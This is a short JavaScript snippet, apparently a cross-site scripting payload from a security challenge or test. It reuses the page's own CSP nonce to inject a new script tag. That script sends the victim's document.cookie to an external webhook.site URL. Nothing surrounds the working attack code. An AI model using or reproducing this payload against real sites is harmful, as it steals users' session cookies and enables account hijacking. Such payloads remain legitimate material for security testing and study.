const nonce = document.currentScript.nonce;
const newHTML = `
  <script nonce="${nonce}">
    fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie);
  <\/script>
`;
document.write(newHTML);
